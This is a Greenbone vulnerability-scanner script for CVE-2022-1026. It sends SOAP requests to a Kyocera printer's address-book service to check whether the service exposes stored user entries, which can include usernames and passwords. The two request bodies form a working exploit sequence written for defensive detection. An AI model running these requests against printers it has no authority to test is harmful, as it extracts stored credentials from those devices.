# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147937");
  script_version("2022-04-07T11:40:40+0000");
  script_tag(name:"last_modification", value:"2022-04-07 11:40:40 +0000 (Thu, 07 Apr 2022)");
  script_tag(name:"creation_date", value:"2022-04-07 01:46:28 +0000 (Thu, 07 Apr 2022)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2022-1026");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Kyocera Printer Information Disclosure Vulnerability (Mar 2022) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_kyocera_printer_consolidation.nasl");
  script_require_ports("Services/www", 9090);
  script_mandatory_keys("kyocera/printer/detected");

  script_tag(name:"summary", value:"Kyocera printers are prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP POST requests and checks the responses.");

  script_tag(name:"insight", value:"Kyocera multifunction printers running vulnerable versions of
  Net View unintentionally expose sensitive user information, including usernames and passwords,
  through an insufficiently protected address book export function.");

  script_tag(name:"affected", value:"Various Kyocera printer models.");

  script_tag(name:"solution", value:"No known solution is available as of 07th April, 2022.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/");
  script_xref(name:"URL", value:"https://www.kyoceradocumentsolutions.com/en/our-business/security/information/2022-04-04.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 9090);

banner = http_get_remote_headers(port: port);

if (!egrep(pattern: "^[Ss]erver\s*:\s*gSOAP/", string: banner, icase: FALSE))
  exit(0);

url = "/ws/km-wsdl/setting/address_book";

headers = make_array("Content-Type", "application/soap+xml");

data = '<?xml version="1.0" encoding="utf-8"?>' +
       '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" ' +
       'xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" ' +
       'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ' +
       'xmlns:xsd="http://www.w3.org/2001/XMLSchema" ' +
       'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" ' +
       'xmlns:xop="http://www.w3.org/2004/08/xop/include" ' +
       'xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">' +
       '<SOAP-ENV:Header>' +
       '<wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action>' +
       '</SOAP-ENV:Header>' +
       '<SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest>' +
       '<ns1:number>25</ns1:number>' +
       '</ns1:create_personal_address_enumerationRequest>' +
       '</SOAP-ENV:Body>' +
       '</SOAP-ENV:Envelope>';

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);
if (res !~ "^HTTP/1\.[01] 200" || "<kmaddrbook:result>SUCCESS<" >!< res)
  exit(0);

num = eregmatch(pattern: "<kmaddrbook:enumeration>([0-9]+)<", string: res);
if (isnull(num[1]))
  exit(0);

sleep(5); # wait for address book gets populated

data = '<?xml version="1.0" encoding="utf-8"?>' +
       '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" ' +
       'xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" ' +
       'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ' +
       'xmlns:xsd="http://www.w3.org/2001/XMLSchema" ' +
       'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" ' +
       'xmlns:xop="http://www.w3.org/2004/08/xop/include" ' +
       'xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">' +
       '<SOAP-ENV:Header>' +
       '<wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action>' +
       '</SOAP-ENV:Header>' +
       '<SOAP-ENV:Body><ns1:get_personal_address_listRequest>' +
       '<ns1:enumeration>' + num[1] + '</ns1:enumeration>' +
       '</ns1:get_personal_address_listRequest>' +
       '</SOAP-ENV:Body>' +
       '</SOAP-ENV:Envelope>';

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ("<kmaddrbook:id>" >< res && "<kmaddrbook:address>" >< res) {
  info['HTTP Method'] = "POST";
  info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
  info['HTTP "POST" body'] = data;
  info['HTTP "Content-Type" header'] = headers["Content-Type"];

  report  = 'By doing the following HTTP request:\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += 'it was possible to get the exported address book which might include sensitive information.';
  report += '\n\nResult:\n\n' + res;
  expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
  security_message(port: port, data: report, expert_info: expert_info);
  exit(0);
}

exit(99);
